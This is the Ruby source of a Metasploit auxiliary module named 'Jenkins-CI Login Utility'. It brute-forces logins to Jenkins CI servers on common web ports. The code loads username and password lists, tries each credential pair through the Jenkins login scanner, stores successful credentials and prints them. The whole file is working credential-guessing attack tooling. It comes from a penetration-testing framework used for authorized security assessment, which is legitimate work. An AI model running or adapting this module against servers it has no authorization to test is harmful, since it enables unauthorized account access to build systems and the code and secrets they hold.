##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/jenkins'

class Metasploit3 < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name'           => 'Jenkins-CI Login Utility',
      'Description'    => 'This module attempts to login to a Jenkins-CI instance using a specific user/pass.',
      'Author'         => [ 'Nicholas Starke <starke.nicholas[at]gmail.com>' ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(8080)
      ], self.class)

    register_autofilter_ports([ 80, 443, 8080, 8081, 8000 ])

    deregister_options('RHOST')
  end

  def run_host(ip)
    cred_collection = Metasploit::Framework::CredentialCollection.new(
            blank_passwords: datastore['BLANK_PASSWORDS'],
            pass_file: datastore['PASS_FILE'],
            password: datastore['PASSWORD'],
            user_file: datastore['USER_FILE'],
            userpass_file: datastore['USERPASS_FILE'],
            username: datastore['USERNAME'],
            user_as_pass: datastore['USER_AS_PASS']
    )

    scanner = Metasploit::Framework::LoginScanner::Jenkins.new(
      host: ip,
      port: rport,
      proxies: datastore['PROXIES'],
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      connection_timeout: 10,
      user_agent: datastore['UserAgent'],
      vhost: datastore['VHOST']
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: fullname,
          workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})"
      end
    end
  end
end
